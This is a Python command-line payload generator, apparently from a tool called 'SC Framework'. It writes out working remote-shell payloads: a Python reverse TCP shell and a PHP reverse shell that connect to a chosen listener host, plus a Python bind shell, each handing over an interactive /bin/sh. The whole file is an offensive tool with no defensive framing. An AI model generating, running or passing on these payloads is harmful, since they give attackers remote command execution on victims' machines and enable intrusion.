import argparse
import os

def generate_payload(payload_type, lhost, lport, output_file):
    # Generate payload based on the selected payload type
    if payload_type == 'reverse_tcp':
        payload = f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    elif payload_type == 'bind_tcp':
        payload = f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"{lhost}\",{lport}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    elif payload_type == 'php_reverse_shell':
        payload = f"<?php\n$sock=fsockopen(\"{lhost}\",{lport});\nexec(\"/bin/sh -i <&3 >&3 2>&3\");\n?>"
    # Write the payload to the output file
    with open(output_file, 'w') as f:
        f.write(payload)

def main():
    parser = argparse.ArgumentParser(description='''SC Framework Payload Generator --->
payloads : 1.reverse_tcp, 2.bind_tcp, 3.php_reverse_shell
''')
    parser.add_argument('-t', '--type', help='Type of payload', required=True)
    parser.add_argument('-lh', '--lhost', help='Listener host', required=True)
    parser.add_argument('-lp', '--lport', help='Listener port', required=True)
    parser.add_argument('-o', '--output', help='Output file', required=True)
    args = parser.parse_args()

    payload_type = args.type
    lhost = args.lhost
    lport = args.lport
    output_file = args.output

    generate_payload(payload_type, lhost, lport, output_file)

if __name__ == '__main__':
    main()
